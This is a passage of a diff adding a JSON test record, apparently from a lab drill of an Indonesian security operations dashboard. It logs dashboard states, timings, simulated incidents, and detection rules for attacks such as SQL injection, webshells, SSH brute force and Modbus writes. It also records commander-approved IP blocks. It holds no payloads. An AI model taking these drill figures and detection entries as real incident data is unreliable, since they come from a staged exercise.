+   "ket": "Rantai audit utuh",
+   "kotak": {
+    "hasil": {
+     "x": 407,
+     "y": 369,
+     "w": 1370,
+     "h": 101
+    }
+   }
+  },
+  {
+   "t": 1794106225681,
+   "video": "analis",
+   "id": "menu-beranda-akhir",
+   "ket": "Menu Beranda",
+   "klik": {
+    "x": 0,
+    "y": 129,
+    "w": 263,
+    "h": 43
+   }
+  },
+  {
+   "t": 1794106230158,
+   "video": "analis",
+   "id": "beranda-akhir",
+   "ket": "Beranda akhir"
+  }
+ ],
+ "sampel": {
+  "analis": [
+   {
+    "t": 1794105714354,
+    "path": "/login",
+    "scrollY": 0,
+    "live": null,
+    "siaga": null,
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105718877,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "polling",
+    "siaga": "Siaga: Aman",
+    "insiden": "Insiden terbuka 0 Tidak ada insiden terbuka",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105719281,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Aman",
+    "insiden": "Insiden terbuka 0 Tidak ada insiden terbuka",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105736642,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Aman",
+    "insiden": "Insiden terbuka 1 Rendah 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105808289,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Siaga",
+    "insiden": "Insiden terbuka 1 Tinggi 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105809937,
+    "path": "/beranda",
+    "scrollY": 767,
+    "live": "live",
+    "siaga": "Siaga: Siaga",
+    "insiden": "Insiden terbuka 1 Tinggi 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105810341,
+    "path": "/beranda",
+    "scrollY": 859,
+    "live": "live",
+    "siaga": "Siaga: Siaga",
+    "insiden": "Insiden terbuka 1 Tinggi 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105826667,
+    "path": "/beranda",
+    "scrollY": 61,
+    "live": "live",
+    "siaga": "Siaga: Siaga",
+    "insiden": "Insiden terbuka 1 Tinggi 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105827069,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Siaga",
+    "insiden": "Insiden terbuka 1 Tinggi 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105894087,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": "Insiden terbuka 2 Kritis 1 Rendah 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105901907,
+    "path": "/kampanye",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105906653,
+    "path": "/kampanye/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105917259,
+    "path": "/insiden",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105921148,
+    "path": "/insiden/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "187",
+    "tahap": 2,
+    "cakupan": null
+   },
+   {
+    "t": 1794105931849,
+    "path": "/insiden/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "211",
+    "tahap": 2,
+    "cakupan": null
+   },
+   {
+    "t": 1794105932270,
+    "path": "/insiden/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "359",
+    "tahap": 2,
+    "cakupan": null
+   },
+   {
+    "t": 1794105937986,
+    "path": "/insiden/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "484",
+    "tahap": 3,
+    "cakupan": null
+   },
+   {
+    "t": 1794105944920,
+    "path": "/insiden/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "761",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105952128,
+    "path": "/insiden/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "858",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105958703,
+    "path": "/insiden/1",
+    "scrollY": 1318,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "858",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105959115,
+    "path": "/insiden/1",
+    "scrollY": 1474,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "858",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105961346,
+    "path": "/insiden/1",
+    "scrollY": 1474,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105964248,
+    "path": "/insiden/1",
+    "scrollY": 1369,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105964654,
+    "path": "/insiden/1",
+    "scrollY": 1228,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105969167,
+    "path": "/insiden/1",
+    "scrollY": 294,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105969578,
+    "path": "/insiden/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105972901,
+    "path": "/penjaga-situs",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105979214,
+    "path": "/penjaga-situs",
+    "scrollY": 161,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105985886,
+    "path": "/penjaga-situs",
+    "scrollY": 26,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105986319,
+    "path": "/penjaga-situs",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105989704,
+    "path": "/insiden/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105991815,
+    "path": "/insiden/1",
+    "scrollY": 1070,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794105992227,
+    "path": "/insiden/1",
+    "scrollY": 1228,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794106032792,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": "Insiden terbuka 2 Kritis 1 Rendah 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 2 1 IP diblokir di firewall host agent",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106041011,
+    "path": "/tindakan",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106048847,
+    "path": "/insiden/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794106050465,
+    "path": "/insiden/1",
+    "scrollY": 1466,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794106050868,
+    "path": "/insiden/1",
+    "scrollY": 1796,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794106055399,
+    "path": "/insiden/1",
+    "scrollY": 2120,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794106055806,
+    "path": "/insiden/1",
+    "scrollY": 2448,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794106066113,
+    "path": "/insiden/1",
+    "scrollY": 802,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794106066518,
+    "path": "/insiden/1",
+    "scrollY": 27,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794106066944,
+    "path": "/insiden/1",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": "946",
+    "tahap": 4,
+    "cakupan": null
+   },
+   {
+    "t": 1794106069387,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": "Insiden terbuka 2 Kritis 1 Rendah 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 2 1 IP diblokir di firewall host agent",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106101173,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": "Insiden terbuka 3 Kritis 1 Tinggi 1 Rendah 1",
+    "agent": "Agent online 2 / 3 1 agent BUTA (sensor mati)",
+    "blokir": "Blokir aktif 2 1 IP diblokir di firewall host agent",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106108187,
+    "path": "/insiden",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106116871,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": "Insiden terbuka 3 Kritis 1 Tinggi 1 Rendah 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 2 1 IP diblokir di firewall host agent",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106121401,
+    "path": "/uji-kesiapan",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106127194,
+    "path": "/uji-kesiapan",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": "0/11"
+   },
+   {
+    "t": 1794106136726,
+    "path": "/uji-kesiapan",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": "1/11"
+   },
+   {
+    "t": 1794106181206,
+    "path": "/uji-kesiapan",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": "2/11"
+   },
+   {
+    "t": 1794106197106,
+    "path": "/uji-kesiapan",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": "11/11"
+   },
+   {
+    "t": 1794106204557,
+    "path": "/uji-kesiapan",
+    "scrollY": 257,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": "11/11"
+   },
+   {
+    "t": 1794106204961,
+    "path": "/uji-kesiapan",
+    "scrollY": 270,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": "11/11"
+   },
+   {
+    "t": 1794106211501,
+    "path": "/uji-kesiapan",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": "11/11"
+   },
+   {
+    "t": 1794106214392,
+    "path": "/audit",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106226621,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": "Insiden terbuka 3 Kritis 1 Tinggi 1 Rendah 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 2 1 IP diblokir di firewall host agent",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   }
+  ],
+  "komandan": [
+   {
+    "t": 1794105713890,
+    "path": "blank",
+    "scrollY": 0,
+    "live": null,
+    "siaga": null,
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105722259,
+    "path": "/login",
+    "scrollY": 0,
+    "live": null,
+    "siaga": null,
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105726817,
+    "path": "/login",
+    "scrollY": 237,
+    "live": null,
+    "siaga": null,
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105727241,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "polling",
+    "siaga": "Siaga: Aman",
+    "insiden": "Insiden terbuka 0 Tidak ada insiden terbuka",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105727643,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Aman",
+    "insiden": "Insiden terbuka 0 Tidak ada insiden terbuka",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105736673,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Aman",
+    "insiden": "Insiden terbuka 1 Rendah 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105808298,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Siaga",
+    "insiden": "Insiden terbuka 1 Tinggi 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794105893726,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": "Insiden terbuka 2 Kritis 1 Rendah 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 0 Belum ada blokir aktif",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106004773,
+    "path": "/persetujuan",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106011281,
+    "path": "/persetujuan",
+    "scrollY": 127,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106012508,
+    "path": "/persetujuan",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": null,
+    "agent": null,
+    "blokir": null,
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106027733,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": "Insiden terbuka 2 Kritis 1 Rendah 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 2 1 IP diblokir di firewall host agent",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106101229,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": "Insiden terbuka 3 Kritis 1 Tinggi 1 Rendah 1",
+    "agent": "Agent online 2 / 3 1 agent BUTA (sensor mati)",
+    "blokir": "Blokir aktif 2 1 IP diblokir di firewall host agent",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   },
+   {
+    "t": 1794106114846,
+    "path": "/beranda",
+    "scrollY": 0,
+    "live": "live",
+    "siaga": "Siaga: Awas",
+    "insiden": "Insiden terbuka 3 Kritis 1 Tinggi 1 Rendah 1",
+    "agent": "Agent online 3 / 3 Tidak ada agent buta",
+    "blokir": "Blokir aktif 2 1 IP diblokir di firewall host agent",
+    "skor": null,
+    "tahap": null,
+    "cakupan": null
+   }
+  ]
+ },
+ "ukur": {
+  "nmapBKeDuaSatuanDiBerandaMs": 1819,
+  "kampanye": {
+   "id": 1,
+   "dibuat": "2026-11-08 02:44:53",
+   "src_ip": "172.30.0.66",
+   "status": "aktif",
+   "unit_count": 2
+  },
+  "insidenKodimA": 1,
+  "usulKeAntreanHpMs": 6853,
+  "waktuSetuju": 1794106012348,
+  "setujuKeDieksekusiDiLayarAnalisMs": 2864,
+  "portal": {
+   "permintaanSukses": 53,
+   "suksesTerakhirSebelumPutus": "09:46:54.293 GET http://172.30.0.11/ -> HTTP 200 (tersambung)",
+   "gagalPertama": "09:46:54.810 GET http://172.30.0.11/ -> kode 000",
+   "setujuKeGagalPertamaMs": 2462,
+   "setujuKeSuksesTerakhirMs": 1945,
+   "catatan": "Penyerang membuka portal tiap ~0,5 detik (curl, batas 1 detik). Blokir aktif di antara sukses terakhir dan gagal pertama; angka yang dipakai adalah gagal pertama."
+  },
+  "lapsitMs": 722,
+  "lapsit": {
+   "id": 1,
+   "dibuat": "2026-11-08 02:47:33",
+   "sha256": "cb407e1d3f21204d5009bee538ea58a43927f1e6cd2cb71f66c5dbc9aa431e41",
+   "generator": "template"
+  },
+  "sensorMatiKeButaMs": 29189,
+  "sensorHidupKeOnlineMs": 3713,
+  "ujiKesiapanDurasiMs": 69851,
+  "auditTeks": "Rantai utuh. 21 baris diperiksa, semua hash cocok. (09:50:18 WIB) Terverifikasi"
+ },
+ "db": {
+  "insiden": [
+   {
+    "id": 1,
+    "skor": 946,
+    "judul": "Serangan dari 172.30.0.66 terhadap Kodim Latihan A",
+    "satuan": "Kodim Latihan A",
+    "src_ip": "172.30.0.66",
+    "status": "baru",
+    "pertama": "2026-11-08 02:42:14.467000",
+    "kampanye": 1,
+    "severity": "kritis",
+    "terakhir": "2026-11-08 02:46:00.305000",
+    "tahap_max": "dampak"
+   },
+   {
+    "id": 2,
+    "skor": 31,
+    "judul": "Serangan dari 172.30.0.66 terhadap Kodim Latihan B",
+    "satuan": "Kodim Latihan B",
+    "src_ip": "172.30.0.66",
+    "status": "baru",
+    "pertama": "2026-11-08 02:44:52.427000",
+    "kampanye": 1,
+    "severity": "rendah",
+    "terakhir": "2026-11-08 02:44:52.427000",
+    "tahap_max": "pengintaian"
+   },
+   {
+    "id": 3,
+    "skor": 96,
+    "judul": "Sensor Buta: kodim-b berhenti mengirim heartbeat",
+    "satuan": "Kodim Latihan B",
+    "src_ip": null,
+    "status": "baru",
+    "pertama": "2026-11-08 02:48:20.400000",
+    "kampanye": null,
+    "severity": "tinggi",
+    "terakhir": "2026-11-08 02:48:20.400000",
+    "tahap_max": "pertahanan_dilumpuhkan"
+   }
+  ],
+  "deteksiPerAturan": [
+   {
+    "nama": "Pemindaian port",
+    "aturan": "R01",
+    "jumlah": 2,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:42:15.811000"
+   },
+   {
+    "nama": "Alat pemindai web",
+    "aturan": "R02",
+    "jumlah": 26,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:45:31.602000"
+   },
+   {
+    "nama": "SQL injection",
+    "aturan": "R04",
+    "jumlah": 15,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:45:31.644000"
+   },
+   {
+    "nama": "XSS",
+    "aturan": "R05",
+    "jumlah": 1,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:45:31.659000"
+   },
+   {
+    "nama": "Path traversal / LFI",
+    "aturan": "R06",
+    "jumlah": 1,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:45:31.675000"
+   },
+   {
+    "nama": "Brute force SSH",
+    "aturan": "R07",
+    "jumlah": 2,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:43:27.762000"
+   },
+   {
+    "nama": "Login berhasil setelah brute force",
+    "aturan": "R08",
+    "jumlah": 1,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:44:49.338000"
+   },
+   {
+    "nama": "Webshell",
+    "aturan": "R09",
+    "jumlah": 1,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:45:37.316000"
+   },
+   {
+    "nama": "Defacement",
+    "aturan": "R10",
+    "jumlah": 1,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:45:51.540000"
+   },
+   {
+    "nama": "Perintah tulis Modbus tanpa izin",
+    "aturan": "R11",
+    "jumlah": 2,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:45:44.418000"
+   },
+   {
+    "nama": "Injeksi judi online ber-cloaking",
+    "aturan": "R13",
+    "jumlah": 1,
+    "insiden": 1,
+    "pertama": "2026-11-08 02:46:00.349000"
+   }
+  ],
+  "jumlahEvent": {
+   "uji": 68,
+   "semua": 1952,
+   "serangan": 1823
+  },
+  "eventPerInsiden": [
+   {
+    "event": 35,
+    "insiden": 1
+   },
+   {
+    "event": 1,
+    "insiden": 2
+   },
+   {
+    "event": 0,
+    "insiden": 3
+   }
+  ],
+  "tindakan": [
+   {
+    "id": 1,
+    "hasil": {
+     "status": "success",
+     "details": null,
+     "message": "IP 172.30.0.66 diblokir 3600 detik di nftables"
+    },
+    "jenis": "block_ip",
+    "params": {
+     "ip": "172.30.0.66",
+     "duration_s": 3600
+    },
+    "status": "dieksekusi",
+    "pemutus": "komandan@sentra.lab",
+    "pengusul": "analis@sentra.lab",
+    "disetujui": "2026-11-08 02:46:52",
+    "diusulkan": "2026-11-08 02:46:38",
+    "dieksekusi": "2026-11-08 02:46:54",
+    "berlaku_sampai": "2026-11-08 03:46:54"
+   },
+   {
+    "id": 2,
+    "hasil": {
+     "status": "success",
+     "details": null,
+     "message": "IP 172.30.0.66 diblokir 3600 detik di nftables"
+    },
+    "jenis": "block_ip",
+    "params": {
+     "ip": "172.30.0.66",
+     "duration_s": 3600
+    },
+    "status": "dieksekusi",
+    "pemutus": "komandan@sentra.lab",
+    "pengusul": "analis@sentra.lab",
+    "disetujui": "2026-11-08 02:46:52",
+    "diusulkan": "2026-11-08 02:46:38",
+    "dieksekusi": "2026-11-08 02:46:54",
+    "berlaku_sampai": "2026-11-08 03:46:54"
+   },
+   {
+    "id": 3,
+    "hasil": {
+     "status": "success",
+     "details": {
+      "skenario": {
+       "R01": {
+        "ok": true,
+        "mulai": "2026-11-08T02:48:49.987+00:00",
+        "pesan": "20 koneksi ke port uji tertutup"
+       },
+       "R02": {
+        "ok": true,
+        "mulai": "2026-11-08T02:48:49.990+00:00",
+        "pesan": "request dengan user agent sqlmap"
+       },
+       "R03": {
+        "ok": true,
+        "mulai": "2026-11-08T02:48:50.215+00:00",
+        "pesan": "30 request ke halaman yang tidak ada"
+       },
+       "R04": {
+        "ok": true,
+        "mulai": "2026-11-08T02:48:51.553+00:00",
+        "pesan": "request berpola SQL injection"
+       },
+       "R05": {
+        "ok": true,
+        "mulai": "2026-11-08T02:48:51.609+00:00",
+        "pesan": "request berpola XSS"
+       },
+       "R06": {
+        "ok": true,
+        "mulai": "2026-11-08T02:48:51.654+00:00",
+        "pesan": "request berpola path traversal"
+       },
+       "R07": {
+        "ok": true,
+        "mulai": "2026-11-08T02:48:51.690+00:00",
+        "pesan": "10 login SSH gagal ke akun uji (kata sandi salah)"
+       },
+       "R09": {
+        "ok": true,
+        "mulai": "2026-11-08T02:48:55.284+00:00",
+        "pesan": "file uji berpola webshell dibuat lalu dihapus"
+       },
+       "R10": {
+        "ok": true,
+        "mulai": "2026-11-08T02:49:00.284+00:00",
+        "pesan": "metadata /var/www/html/index.php diubah tanpa mengubah isi"
+       },
+       "R12": {
+        "ok": true,
+        "mulai": "2026-11-08T02:49:05.285+00:00",
